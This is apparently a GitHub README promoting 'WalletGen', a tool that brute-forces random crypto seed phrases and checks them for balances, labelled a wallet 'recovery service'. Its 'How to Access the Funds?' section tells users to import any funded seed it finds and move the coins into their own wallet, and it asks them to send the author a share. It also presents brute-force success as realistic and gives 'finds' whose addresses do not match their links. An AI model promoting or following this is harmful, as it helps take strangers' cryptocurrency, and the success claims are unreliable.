# WalletGen: Your Comprehensive Crypto Wallet Recovery Service

Need a reliable **crypto wallet recovery service**?  **WalletGen** offers a powerful, open-source solution. This tool allows you to generate and potentially recover lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets**. It uses real-time balance checking and a high-performance C++ engine.

<!--
Meta description:
Looking for a crypto wallet recovery service? Discover WalletGen, the high-speed, open-source tool that can help you recover lost Bitcoin, Ethereum, and more.
-->

## Quick Navigation
- [How It Works](#how-it-works)
- [Why WalletGen](#why-walletgen)
- [Features](#features)
- [Download WalletGen](#how-to-start)
- [Database Download](#download-and-use-database-for-more-speed)
- [The Program Found a Wallet - What Next?](#the-program-found-a-wallet--whats-next)
- [Recovery Your Bitcoin Wallet](#recovery-your-bitcoin-wallet)
- [My Finds](#my-finds)
- [FAQ](#-frequently-asked-questions-faq)
- [Build Instructions](#building-the-project)
- [Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="crypto wallet recovery" title="WalletGen - Crypto Wallet Recovery Service" height="460" src="/mockups/over.webp" />
</p>

⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access.

## How It Works

WalletGen generates wallets using [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin, and [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing for EVM-based chains like Ethereum.

The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers. 

Wallet Gen is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, Wallet Gen boasts significantly higher wallet generation speeds, with performance primarily relying on your CPU & GPU.

##  Why WalletGen?

Unlike Python-based brute force tools, **WalletGen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **10x faster** performance. Whether you’re exploring lost wallets, verifying private key space, or recovering your own wallet, WalletGen gives you the power to do it efficiently and securely.

## Features

-   **Generate Wallets:** Creates wallets.
-   **Search for Wallets with Balances:** Finds wallets.
-   **Algorithm Support:** Key algorithms.
-   **Database Integration:** Allows for database use.
-   **High-Speed Operation:** Leverages the CPU and GPU.
-   **Bitcoin Wallet Recovery:** Recover Bitcoin.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="crypto wallet recovery service demo" title="WalletGen - Crypto Wallet Recovery Demo" src="/mockups/divide.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="crypto wallet recovery service on Linux" title="WalletGen - Crypto Recovery on Linux" src="/mockups/basic.webp" />
</p>

# How to start

## Windows 
- Download [Release](../../releases) 
- Unpack anywhere
- Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget 
or download [Release for Linux](../../releases) 




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** allows you to search using brute-force method for two types of crypto wallets with an existing balance.

### For Bitcoin (BTC) wallets:

* Press key 3 in the menu or run start_search_btc.bat to search Bitcoin wallets through the internet. This method may take longer, as it checks wallet balances in real-time via blockchain explorers.
* Press key 6 to search Bitcoin wallets using the database. This method is faster because it compares generated wallets against a pre-built database of known addresses with balances.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

* Press key 5 or run start_search_evm.bat to search EVM wallets through the internet. This method checks for wallets with balance in real-time through blockchain explorers.
* Press key 6 to search EVM wallets using the database. This method is faster since it compares generated wallets against the known database of addresses with balance.

### Speed Considerations:

* The speed of the search depends heavily on your hardware, especially the graphics card (GPU). To speed up the process and increase your chances of finding a wallet with a balance, you can run multiple instances of the program (1 to 4), depending on your system's performance

By using the database, you can significantly improve the efficiency of your search, as it eliminates the need to query the blockchain for every wallet generated

## The Program Found a Wallet — What’s Next?
When the program finds a wallet with a balance, it will:
* **Stop** immediately
* **Display** the wallet details in the console
* **Save** this data in the ``found_wallets.txt`` file

### How to Access the Funds?
1. Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet (such as Metamask, Trust Wallet, or Electrum).
2. Once restored, you’ll be able to transfer the funds to your own wallet.
   
>  If the find is successful, be sure to share a small portion of the balance you find with me! Thank you!

## Recovery Your Bitcoin Wallet

WalletGen allows you to recover your bitcoin wallet by seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, as well as searching for missing words using special characters.

### Process Description

#### Search for missing words:

If your seed phrase is missing some words or you are unsure, replace those words with an *. WalletGen will search through all possible variations in the places of * to find the correct seed phrase and restore the associated wallet balance.

#### Entering a complete seed-phrase:

If you have a full 12-word seed, simply enter it in full with a space. WalletGen will generate all address types (Legacy, SegWit, P2SH) and check their balances.

![recovery](/mockups/under.webp)

### Important recommendations

* Seed-phrase must contain exactly 12 words.
* Use only the * symbol to search for missing words.
* Searching for missing words may take considerable time, especially if several words are missing.
* If the wallet with balance is successfully recovered, the program will automatically stop and save the found data.

## My Finds

![mywallet](/mockups/session.webp)


I’ve personally recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).  
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/mockups/element.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

![image](/mockups/web.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/mockups/back.webp)


## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any other compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
You can download the WalletGen given on the [release download page](../../releases) 

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [release   page](../../releases) 

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes. WalletGen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

I encourage you, when you find a wallet with a balance, to send me a small portion as a thank you. This motivates me to keep working on the program, keep it going, and make it better!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)







Update:  17.06.2025 The link is now available and working perfectly.